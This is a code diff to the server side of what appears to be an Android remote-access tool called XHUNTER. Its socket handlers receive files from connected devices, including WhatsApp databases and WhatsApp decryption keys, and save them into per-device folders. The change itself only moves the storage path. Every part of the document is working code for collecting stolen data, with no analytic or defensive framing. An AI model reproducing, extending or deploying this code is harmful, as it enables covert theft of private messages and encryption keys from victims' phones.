@@ -37,9 +37,9 @@ io.on('connection', (socket) => {
       rn_bridge.channel.post('getDir',JSON.stringify(data));
     });
     socket.on("download", (d, callback) => {
-      if(fs.existsSync(`/storage/emulated/0/documents/XHUNTER`)){
-        if(fs.existsSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
+        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -47,8 +47,8 @@ io.on('connection', (socket) => {
             },2000)
           });
         }else{
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -57,9 +57,9 @@ io.on('connection', (socket) => {
           });
         }
       }else{
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER`);
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -71,9 +71,9 @@ io.on('connection', (socket) => {
 
 
     socket.on("downloadWhatsappDatabase", (d, callback) => {
-      if(fs.existsSync(`/storage/emulated/0/documents/XHUNTER`)){
-        if(fs.existsSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
+        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -81,8 +81,8 @@ io.on('connection', (socket) => {
             },2000)
           });
         }else{
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -91,9 +91,9 @@ io.on('connection', (socket) => {
           });
         }
       }else{
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER`);
-          fs.mkdirSync(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
-          fs.appendFile(`/storage/emulated/0/documents/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
+          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
+          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
             if (err) log(err);
             rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
             setTimeout(()=>{
@@ -105,7 +105,7 @@ io.on('connection', (socket) => {
 
      
     socket.on("downloadWhatsappKey", (d, callback) => {
-      fs.appendFile(`/storage/emulated/0/documents/${d.fileName}`, Buffer.from(d.fileData), function (err) {
+      fs.appendFile(`/storage/emulated/0/${d.fileName}`, Buffer.from(d.fileData), function (err) {
         if (err) log(err);
         callback("success")
       });
